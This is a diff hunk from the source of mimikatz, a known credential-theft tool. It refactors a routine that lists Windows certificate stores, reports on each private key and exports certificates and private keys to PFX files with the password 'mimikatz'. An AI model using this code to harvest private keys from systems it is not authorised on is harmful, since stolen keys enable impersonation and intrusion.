@@ -272,103 +272,102 @@ void mod_mimikatz_crypto::listAndOrExportCertificates(vector<wstring> * argument
 				wstring * certName = new wstring();
 				bool reussite = false;
 
-				if(mod_crypto::getCertNameFromCertCTX(pCertContext, certName))
-				{
-					wcout << L"\t - " << *certName << endl;;
-					sanitizeFileName(certName);
+				if(!mod_crypto::getCertNameFromCertCTX(pCertContext, certName))
+					certName->assign(L"[empty]");
 
-					wstringstream monBuff;
-					monBuff << monEmplacement << L'_' << monStore << L'_' << i << L'_' << *certName << L'.';
+				wcout << L"\t - " << *certName << endl;;
+				sanitizeFileName(certName);
+
+				wstringstream monBuff;
+				monBuff << monEmplacement << L'_' << monStore << L'_' << i << L'_' << *certName << L'.';
 										
-					mod_crypto::KIWI_KEY_PROV_INFO keyProvInfo;
-					if(mod_crypto::getKiwiKeyProvInfo(pCertContext, &keyProvInfo))
+				mod_crypto::KIWI_KEY_PROV_INFO keyProvInfo;
+				if(mod_crypto::getKiwiKeyProvInfo(pCertContext, &keyProvInfo))
+				{
+					wcout << L"\t\tContainer Clé : " << keyProvInfo.pwszContainerName << endl;
+					wcout << L"\t\tProvider      : " << keyProvInfo.pwszProvName << endl;
+						
+					HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv = NULL;
+					DWORD keySpec = 0;
+					BOOL aFermer = false;
+						
+					if(CryptAcquireCertificatePrivateKey(pCertContext, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG /* CRYPT_ACQUIRE_SILENT_FLAG NULL */, NULL, &monProv, &keySpec, &aFermer))
 					{
-						wcout << L"\t\tContainer Clé : " << keyProvInfo.pwszContainerName << endl;
-						wcout << L"\t\tProvider      : " << keyProvInfo.pwszProvName << endl;
-						
-						HCRYPTPROV_OR_NCRYPT_KEY_HANDLE monProv = NULL;
-						DWORD keySpec = 0;
-						BOOL aFermer = false;
-						
-						if(CryptAcquireCertificatePrivateKey(pCertContext, CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG /* CRYPT_ACQUIRE_SILENT_FLAG NULL */, NULL, &monProv, &keySpec, &aFermer))
-						{
-							wcout << L"\t\tType          : " << mod_crypto::KeyTypeToString(keySpec) << endl;
+						wcout << L"\t\tType          : " << mod_crypto::KeyTypeToString(keySpec) << endl;
 							
-							DWORD size = 0;
-							bool exportable = false;
+						DWORD size = 0;
+						bool exportable = false;
 
-							if(keySpec == CERT_NCRYPT_KEY_SPEC)
+						if(keySpec == CERT_NCRYPT_KEY_SPEC)
+						{
+							if(mod_cryptong::isNcrypt)
 							{
-								if(mod_cryptong::isNcrypt)
-								{
-									reussite = mod_cryptong::getKeySize(&monProv, &size);
-									reussite &=mod_cryptong::isKeyExportable(&monProv, &exportable);
-
-									if(aFermer)
-									{
-										mod_cryptong::NCryptFreeObject(monProv);
-									}
-								}
-								else wcout << L"\t\t\tErreur : Clé de type nCrypt, sans nCrypt ?" << endl;
-							}
-							else
-							{
-								DWORD tailleEcrite = 0;
-								DWORD exportability;
-
-								HCRYPTKEY maCle = NULL;
-								if(reussite = (CryptGetUserKey(monProv, keySpec, &maCle) != 0))
-								{
-									tailleEcrite = sizeof(DWORD);
-									reussite = (CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&size), &tailleEcrite, NULL) != 0);
-									tailleEcrite = sizeof(DWORD);
-									reussite &= (CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&exportability), &tailleEcrite, NULL) != 0);
-									exportable = (exportability & CRYPT_EXPORT) != 0;
-								}
+								reussite = mod_cryptong::getKeySize(&monProv, &size);
+								reussite &=mod_cryptong::isKeyExportable(&monProv, &exportable);
 
 								if(aFermer)
 								{
-									CryptReleaseContext(monProv, 0);
+									mod_cryptong::NCryptFreeObject(monProv);
 								}
 							}
-							if(reussite)
-							{
-								wcout << L"\t\tExportabilité : " << (exportable ? L"OUI" : L"NON") << endl;
-								wcout << L"\t\tTaille clé    : " << size << endl;
-							}
-
-							if(exportCert)
-							{
-								wstring PFXFile = monBuff.str();
-								PFXFile.append(L"pfx");
-
-								reussite = mod_crypto::CertCTXtoPFX(pCertContext, PFXFile, L"mimikatz");
-
-								wcout << L"\t\tExport privé dans  \'" << PFXFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
-								if(!reussite)
-								{
-									wcout << L"\t\t\t" << mod_system::getWinError() << endl;
-								}
-							}
+							else wcout << L"\t\t\tErreur : Clé de type nCrypt, sans nCrypt ?" << endl;
 						}
-						else wcout << L"CryptAcquireCertificatePrivateKey : " << mod_system::getWinError() << endl;
-					}
-
-					if(exportCert)
-					{
-						wstring DERFile = monBuff.str();
-						DERFile.append(L"der");
-						
-						reussite = mod_crypto::CertCTXtoDER(pCertContext, DERFile);
-						
-						wcout << L"\t\tExport public dans \'" << DERFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
-						if(!reussite)
+						else
 						{
-							wcout << L"\t\t\t" << mod_system::getWinError() << endl;
+							DWORD tailleEcrite = 0;
+							DWORD exportability;
+
+							HCRYPTKEY maCle = NULL;
+							if(reussite = (CryptGetUserKey(monProv, keySpec, &maCle) != 0))
+							{
+								tailleEcrite = sizeof(DWORD);
+								reussite = (CryptGetKeyParam(maCle, KP_KEYLEN, reinterpret_cast<BYTE *>(&size), &tailleEcrite, NULL) != 0);
+								tailleEcrite = sizeof(DWORD);
+								reussite &= (CryptGetKeyParam(maCle, KP_PERMISSIONS, reinterpret_cast<BYTE *>(&exportability), &tailleEcrite, NULL) != 0);
+								exportable = (exportability & CRYPT_EXPORT) != 0;
+							}
+
+							if(aFermer)
+							{
+								CryptReleaseContext(monProv, 0);
+							}
 						}
+						if(reussite)
+						{
+							wcout << L"\t\tExportabilité : " << (exportable ? L"OUI" : L"NON") << endl;
+							wcout << L"\t\tTaille clé    : " << size << endl;
+						}
+
+						if(exportCert)
+						{
+							wstring PFXFile = monBuff.str();
+							PFXFile.append(L"pfx");
+
+							reussite = mod_crypto::CertCTXtoPFX(pCertContext, PFXFile, L"mimikatz");
+
+							wcout << L"\t\tExport privé dans  \'" << PFXFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
+							if(!reussite)
+							{
+								wcout << L"\t\t\t" << mod_system::getWinError() << endl;
+							}
+						}
+					}
+					else wcout << L"CryptAcquireCertificatePrivateKey : " << mod_system::getWinError() << endl;
+				}
+
+				if(exportCert)
+				{
+					wstring DERFile = monBuff.str();
+					DERFile.append(L"der");
+						
+					reussite = mod_crypto::CertCTXtoDER(pCertContext, DERFile);
+						
+					wcout << L"\t\tExport public dans \'" << DERFile << L"\' : " << (reussite ? L"OK" : L"KO") << endl;
+					if(!reussite)
+					{
+						wcout << L"\t\t\t" << mod_system::getWinError() << endl;
 					}
 				}
-				else wcout << L"mod_crypto::getCertNameFromCertCTX : " << mod_system::getWinError() << endl;
 				delete certName;
 			}
 			CertCloseStore(hCertificateStore, CERT_CLOSE_STORE_FORCE_FLAG);
